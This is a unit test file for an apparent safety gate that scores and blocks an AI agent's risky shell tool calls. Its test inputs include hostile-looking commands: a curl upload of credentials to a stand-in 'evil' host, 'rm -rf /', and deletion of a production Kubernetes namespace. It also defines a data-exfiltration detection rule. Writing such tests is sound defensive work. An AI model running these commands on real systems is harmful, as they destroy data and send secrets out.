// Unit tests for rule matching, the band logic, two-stage escalation, worst-wins aggregation, the
// YAML parser and config validation. The decider's model calls are replaced by a fake engine, so
// these run with no omp host and no pi-ai. Run with: node test.mjs  (Node >= 22.18 / 23.6.)

import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

import { createHandler, decide, describe as describeCall, matchesTool, matchingRules, renderState } from "./index.ts";
import { escalationPrompt, parseEscalation, readRuleScore, resolveRole, resolveRoleModel } from "./decider.ts";
import { DEFAULTS, loadConfig, parseYaml, validateConfig } from "./config.ts";

function cfg(overrides = {}) {
  return { ...structuredClone(DEFAULTS), ...overrides };
}

// Fake Engine. `scores` is the per-rule map stage 1 returns ({risk, pBlock?}), or undefined when
// the judge is unavailable. `verdict` is the llm's answer: one {verdict, reason} applied to every
// escalated rule, a per-rule map, or undefined for no answer.
function makeEngine(options = {}) {
  const { scores, verdict, judgeModel = { id: "judge" }, llmModel = { id: "llm" }, conversation } = options;
  const calls = { classify: 0, escalate: 0, escalatedRules: [] };
  const engine = {
    resolveRole: (_ctx, roles) => (roles.includes("judge") ? judgeModel : llmModel),
    classify: async () => {
      calls.classify += 1;
      return scores;
    },
    escalate: async (_ctx, _model, rules) => {
      calls.escalate += 1;
      calls.escalatedRules = rules.map((r) => r.name);
      if (verdict === undefined) {
        return undefined;
      }
      if (typeof verdict.verdict === "string") {
        return Object.fromEntries(rules.map((r) => [r.name, verdict]));
      }
      return verdict;
    },
    conversationText: () => conversation,
  };
  return { engine, calls };
}

const bash = (command) => ({ toolName: "bash", input: { command } });
const auto = (risk, pBlock) => ({ "auto-mode": { risk, pBlock } });
const exfilRule = (over = {}) => ({
  name: "exfil",
  description: "data exfiltration",
  tools: ["bash"],
  question: "Considering only data leaving the user's systems: run, ask, or block?",
  answers: { allow: "nothing leaves", ask: "may leave, confirm", block: "secrets sent out" },
  allowBelow: 0.1,
  askAbove: 0.3,
  blockAbove: 0.8,
  ...over,
});

test("matchesTool / matchingRules", () => {
  assert.equal(matchesTool({ tools: ["*"] }, "bash"), true);
  assert.equal(matchesTool({ tools: ["web*"] }, "web_search"), true);
  assert.equal(matchesTool({ tools: ["bash"] }, "edit"), false);
  const rules = [{ name: "a", tools: ["bash"] }, { name: "b", tools: ["*"] }];
  assert.deepEqual(matchingRules(rules, "bash").map((r) => r.name), ["a", "b"]);
  assert.deepEqual(matchingRules(rules, "edit").map((r) => r.name), ["b"]);
});

test("describe / renderState", () => {
  assert.equal(describeCall("bash", { command: "ls -la" }), "ls -la");
  assert.ok(describeCall("web_search", { query: "x" }).startsWith("web_search "));
  assert.match(renderState("bash", "ls", undefined), /Proposed tool call \(tool: bash\):\nls/);
  assert.match(renderState("bash", "ls", "User: hi"), /^Conversation so far:\nUser: hi/);
});

test("the built-in rule is written out in full and asks but never blocks", () => {
  const rule = DEFAULTS.rules[0];
  assert.equal(rule.name, "auto-mode");
  assert.ok(rule.question.length > 0);
  assert.deepEqual(Object.keys(rule.answers).sort(), ["allow", "ask", "block"]);
  assert.equal(rule.allowBelow, 0.1);
  assert.equal(rule.askAbove, 0.2);
  assert.equal(rule.blockAbove, undefined);
});

test("validateConfig: one rule shape, question and answers required", () => {
  const ok = validateConfig({ rules: [exfilRule()] });
  assert.equal(ok.error, undefined);
  assert.equal(ok.config.rules[0].answers.block, "secrets sent out");

  const askOnly = validateConfig({ rules: [exfilRule({ answers: { allow: "a", ask: "b" }, blockAbove: undefined })] });
  assert.equal(askOnly.error, undefined);
  assert.equal(askOnly.config.rules[0].answers.block, undefined);

  assert.ok(validateConfig({ rules: [exfilRule({ question: undefined })] }).error, "question required");
  assert.ok(validateConfig({ rules: [exfilRule({ answers: undefined })] }).error, "answers required");
  assert.ok(validateConfig({ rules: [exfilRule({ answers: { allow: "a" } })] }).error, "ask required");
  assert.ok(validateConfig({ rules: [exfilRule({ answers: { yes: "y", no: "n" } })] }).error, "only allow/ask/block");
  assert.ok(validateConfig({ rules: [exfilRule({ answers: { allow: "a", ask: "b" } })] }).error, "blockAbove needs a block answer");
  assert.ok(validateConfig({ rules: [exfilRule({ type: "noul" })] }).error, "unknown rule key");
  assert.ok(validateConfig({ rules: [exfilRule({ name: undefined })] }).error, "name required");
  assert.ok(validateConfig({ rules: [exfilRule(), exfilRule()] }).error, "names must be unique");
  assert.ok(validateConfig({ rules: [exfilRule({ allowBelow: 0.5, askAbove: 0.2 })] }).error, "allowBelow <= askAbove");
  assert.ok(validateConfig({ enabled: "yes" }).error);

  const roles = validateConfig({ judgeRole: null, llmRole: "" });
  assert.equal(roles.error, undefined);
  assert.equal(roles.config.judgeRole, "");
  assert.equal(roles.config.llmRole, "");
});

test("allow band: risk < allowBelow runs, no escalation", async () => {
  const { engine, calls } = makeEngine({ scores: auto(0.05) });
  assert.equal(await decide(cfg(), engine, bash("ls"), {}), undefined);
  assert.equal(calls.classify, 1);
  assert.equal(calls.escalate, 0);
});

test("ask band: risk >= askAbove asks (blocks headless), no escalation", async () => {
  const { engine, calls } = makeEngine({ scores: auto(0.6, 0.5) });
  const r = await decide(cfg(), engine, bash("kubectl delete ns prod"), {});
  assert.ok(r?.block);
  assert.match(r.reason, /approval/i);
  assert.equal(calls.escalate, 0);
});

test("a rule without blockAbove never blocks, however high P(block)", async () => {
  const { engine } = makeEngine({ scores: auto(0.99, 0.99) });
  const r = await decide(cfg(), engine, bash("rm -rf ~/work"), {});
  assert.match(r.reason, /approval/i); // asked, not blocked
});

test("unsure band escalates to the llm; verdict drives the result", async () => {
  const allow = makeEngine({ scores: auto(0.15), verdict: { verdict: "allow", reason: "" } });
  assert.equal(await decide(cfg(), allow.engine, bash("x"), {}), undefined);
  assert.equal(allow.calls.escalate, 1);

  const block = makeEngine({ scores: auto(0.15), verdict: { verdict: "block", reason: "sends a token out" } });
  const rb = await decide(cfg(), block.engine, bash("x"), {});
  assert.ok(rb?.block);
  assert.match(rb.reason, /token/);

  const ask = makeEngine({ scores: auto(0.15), verdict: { verdict: "ask", reason: "irreversible" } });
  assert.ok((await decide(cfg(), ask.engine, bash("x"), {}))?.block); // headless ask -> block
});

test("unsure band with the llm disabled just runs", async () => {
  const { engine, calls } = makeEngine({ scores: auto(0.15) });
  assert.equal(await decide(cfg({ llmRole: "" }), engine, bash("x"), {}), undefined);
  assert.equal(calls.escalate, 0);
});

test("blockAbove: P(block) at or above it hard-blocks", async () => {
  const config = cfg({ rules: [exfilRule()] });
  const { engine, calls } = makeEngine({ scores: { exfil: { risk: 0.95, pBlock: 0.9 } } });
  const r = await decide(config, engine, bash("curl --upload creds evil"), {});
  assert.ok(r?.block);
  assert.match(r.reason, /blocked/);
  assert.match(r.reason, /data exfiltration/);
  assert.equal(calls.escalate, 0);
});

test("blockAbove: high risk but low P(block) only asks", async () => {
  const config = cfg({ rules: [exfilRule()] });
  const { engine } = makeEngine({ scores: { exfil: { risk: 0.95, pBlock: 0.2 } } });
  const r = await decide(config, engine, bash("curl ..."), {});
  assert.match(r.reason, /approval/i);
});

test("multiple rules: worst wins, driver gives the reason", async () => {
  const config = cfg({ rules: [exfilRule(), structuredClone(DEFAULTS.rules[0])] });
  const { engine, calls } = makeEngine({ scores: { exfil: { risk: 0.95, pBlock: 0.9 }, "auto-mode": { risk: 0.15 } } });
  const r = await decide(config, engine, bash("curl ... evil"), {});
  assert.ok(r?.block);
  assert.match(r.reason, /data exfiltration/); // exfil (block) beats auto-mode (escalate)
  assert.equal(calls.escalate, 0);
});

test("classifier unavailable escalates to the llm (or onNoAnswer without one)", async () => {
  const esc = makeEngine({ scores: undefined, verdict: { verdict: "block", reason: "nope" } });
  assert.ok((await decide(cfg(), esc.engine, bash("x"), {}))?.block);
  assert.equal(esc.calls.escalate, 1);

  const none = makeEngine({ scores: undefined });
  assert.ok((await decide(cfg({ llmRole: "" }), none.engine, bash("x"), {}))?.block); // onNoAnswer=block
  assert.equal(none.calls.escalate, 0);
});

test("llm-only (judge disabled) escalates every in-scope call", async () => {
  const { engine, calls } = makeEngine({ verdict: { verdict: "ask", reason: "prod" } });
  assert.ok((await decide(cfg({ judgeRole: "" }), engine, bash("x"), {}))?.block);
  assert.equal(calls.classify, 0);
  assert.equal(calls.escalate, 1);
});

test("both stages off: pass through to native approval", async () => {
  const { engine, calls } = makeEngine({ scores: auto(0.99) });
  assert.equal(await decide(cfg({ judgeRole: "", llmRole: "" }), engine, bash("rm -rf /"), {}), undefined);
  assert.equal(calls.classify, 0);
  assert.equal(calls.escalate, 0);
});

test("whitelist, disabled gate, no-rule-match all skip scoring", async () => {
  const w = makeEngine({ scores: auto(0.99) });
  assert.equal(await decide(cfg(), w.engine, { toolName: "read", input: {} }, {}), undefined);
  assert.equal(w.calls.classify, 0);

  const d = makeEngine({ scores: auto(0.99) });
  assert.equal(await decide(cfg({ enabled: false }), d.engine, bash("rm -rf /"), {}), undefined);
  assert.equal(d.calls.classify, 0);

  const n = makeEngine({ scores: { exfil: { risk: 0.99 } } });
  assert.equal(await decide(cfg({ rules: [exfilRule()] }), n.engine, { toolName: "edit", input: {} }, {}), undefined);
  assert.equal(n.calls.classify, 0);
});

test("ask with a UI: allow on yes, block on no", async () => {
  const yes = { hasUI: true, ui: { confirm: async () => true } };
  assert.equal(await decide(cfg(), makeEngine({ scores: auto(0.6) }).engine, bash("x"), yes), undefined);
  const no = { hasUI: true, ui: { confirm: async () => false } };
  assert.ok((await decide(cfg(), makeEngine({ scores: auto(0.6) }).engine, bash("x"), no))?.block);
});

test("onNoAnswer=allow lets an unevaluable call pass", async () => {
  const { engine } = makeEngine({ scores: undefined });
  assert.equal(await decide(cfg({ llmRole: "", onNoAnswer: "allow" }), engine, bash("x"), {}), undefined);
});

test("createHandler turns a thrown error into the no-answer policy", async () => {
  const throwing = {
    resolveRole: () => ({ id: "m" }),
    classify: async () => {
      throw new Error("boom");
    },
    escalate: async () => undefined,
    conversationText: () => undefined,
  };
  assert.ok((await createHandler(cfg(), throwing)(bash("x"), {}))?.block);
  assert.equal(await createHandler(cfg({ onNoAnswer: "allow" }), throwing)(bash("x"), {}), undefined);
});

test("parseEscalation reads one verdict line per rule", () => {
  const rules = [exfilRule(), { ...exfilRule({ name: "prod" }), answers: { allow: "a", ask: "b" } }];
  const v = parseEscalation("exfil: BLOCK — posts creds to a paste site\n**prod**: block - no prod change\nnoise: ALLOW — x", rules);
  assert.equal(v.exfil.verdict, "block");
  assert.match(v.exfil.reason, /paste site/);
  assert.equal(v.prod.verdict, "ask"); // no block answer, so BLOCK reads as ASK
  assert.equal(v.noise, undefined);
  assert.deepEqual(parseEscalation("I think it's fine.", rules), {});
});

test("escalationPrompt asks each rule's own question and only offers BLOCK when it has a block answer", () => {
  const rules = [exfilRule(), { ...exfilRule({ name: "prod", question: "Prod change?" }), answers: { allow: "a", ask: "b" } }];
  const p = escalationPrompt(rules, "Proposed tool call (tool: bash):\ncurl x");
  assert.match(p, /Rule "exfil": Considering only data leaving/);
  assert.match(p, /Rule "prod": Prod change\?\n- ALLOW: a\n- ASK: b$/m);
  assert.doesNotMatch(p.split('Rule "prod"')[1], /- BLOCK/);
  assert.match(p, /curl x/);
});

test("the llm only judges the unsure rules", async () => {
  const config = cfg({ rules: [exfilRule(), structuredClone(DEFAULTS.rules[0])] });
  const { engine, calls } = makeEngine({ scores: { exfil: { risk: 0.15 }, "auto-mode": { risk: 0.02 } }, verdict: { verdict: "allow", reason: "" } });
  assert.equal(await decide(config, engine, bash("curl x"), {}), undefined);
  assert.deepEqual(calls.escalatedRules, ["exfil"]);
});

test("an llm block only blocks on a rule with blockAbove; otherwise it asks", async () => {
  const blocking = makeEngine({ scores: { exfil: { risk: 0.15 } }, verdict: { verdict: "block", reason: "secrets out" } });
  const r1 = await decide(cfg({ rules: [exfilRule()] }), blocking.engine, bash("x"), {});
  assert.match(r1.reason, /blocked this call — data exfiltration: secrets out/);

  const asking = makeEngine({ scores: auto(0.15), verdict: { verdict: "block", reason: "secrets out" } });
  const r2 = await decide(cfg(), asking.engine, bash("x"), {});
  assert.match(r2.reason, /needs your approval — General safety check: secrets out/);
});

test("the ask dialog has a title and a body with the reason, the score and the command", async () => {
  let title;
  let message;
  const ctx = { hasUI: true, ui: { confirm: async (t, m) => { title = t; message = m; return true; } } };
  const { engine } = makeEngine({ scores: auto(0.6, 0.1) });
  assert.equal(await decide(cfg(), engine, bash("kubectl delete ns prod"), ctx), undefined);
  assert.equal(title, "omp-warden: General safety check");
  assert.match(message, /risky enough to need your approval/);
  assert.match(message, /risk 0\.60, P\(block\) 0\.10 · asks at 0\.2/);
  assert.match(message, /bash: kubectl delete ns prod/);
  assert.doesNotMatch(`${title}${message}`, /undefined/);
});

test("readRuleScore: risk from P(allow), P(block) only when the rule has a block answer", () => {
  const withBlock = { answers: { allow: "a", ask: "b", block: "c" } };
  const askOnly = { answers: { allow: "a", ask: "b" } };
  const s = readRuleScore(withBlock, { probabilities: { allow: 0.9, ask: 0.06, block: 0.04 } });
  assert.equal(s.risk.toFixed(3), "0.100");
  assert.equal(s.pBlock, 0.04);
  assert.equal(readRuleScore(askOnly, { probabilities: { allow: 0.9, ask: 0.1 } }).pBlock, undefined);
  assert.equal(readRuleScore(withBlock, { probabilities: {} }), undefined);
  assert.equal(readRuleScore(withBlock, null), undefined);
});

test("resolveRole / resolveRoleModel", () => {
  const judge = { provider: "local", id: "lfm2" };
  const reg = { find: (p, i) => (i === "lfm2" ? judge : i === "d" ? { id: "d" } : undefined), getApiKey: async () => "k" };
  const ctx = { modelRegistry: reg, model: { id: "session" }, settings: { getModelRole: (r) => (r === "judge" ? "local/lfm2:high" : r === "default" ? "local/d" : undefined) } };
  assert.equal(resolveRoleModel(ctx, "judge"), judge);
  assert.equal(resolveRole(ctx, ["smol", "default"]).id, "d"); // smol unset -> default
  const none = { modelRegistry: reg, model: { id: "session" }, settings: { getModelRole: () => undefined } };
  assert.equal(resolveRole(none, ["smol", "default"]).id, "session"); // falls back to session model
});

test("parseYaml handles the config subset (comments, flow arrays, folded scalars, numbers/bools)", () => {
  const y = [
    "enabled: true",
    "judgeRole: judge        # trailing comment",
    "rules:",
    "  - name: auto-mode",
    '    tools: ["*"]',
    "    answers:",
    "      allow: run it",
    "      ask: confirm",
    "    allowBelow: 0.1",
    "  - name: exfil",
    "    tools: [bash, web_fetch]",
    "    question: >",
    "      line one",
    "      line two",
    "    askAbove: 0.3",
    "",
  ].join("\n");
  const o = parseYaml(y);
  assert.equal(o.enabled, true);
  assert.equal(o.judgeRole, "judge");
  assert.equal(o.rules.length, 2);
  assert.deepEqual(o.rules[0].tools, ["*"]);
  assert.deepEqual(o.rules[0].answers, { allow: "run it", ask: "confirm" });
  assert.equal(o.rules[0].allowBelow, 0.1);
  assert.deepEqual(o.rules[1].tools, ["bash", "web_fetch"]);
  assert.equal(o.rules[1].question, "line one line two");
  assert.equal(o.rules[1].askAbove, 0.3);
});

test("loadConfig reads a YAML file and defaults the thresholds", () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "warden-"));
  const file = path.join(dir, "config.yaml");
  fs.writeFileSync(file, [
    "enabled: true",
    "rules:",
    "  - name: net",
    "    description: network access",
    "    tools: [bash]",
    "    question: >",
    "      Considering only network access: should this run, need approval, or be blocked?",
    "    answers:",
    "      allow: Only reaches hosts the user named.",
    "      ask: Reaches a host the user did not name.",
    "",
  ].join("\n"));
  try {
    const { config, error } = loadConfig(file);
    assert.equal(error, undefined);
    assert.equal(config.rules[0].name, "net");
    assert.match(config.rules[0].question, /network access/);
    assert.equal(config.rules[0].answers.block, undefined);
    assert.equal(config.rules[0].allowBelow, 0.1);
    assert.equal(config.rules[0].askAbove, 0.2);
    assert.equal(config.includeContext, true);
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});
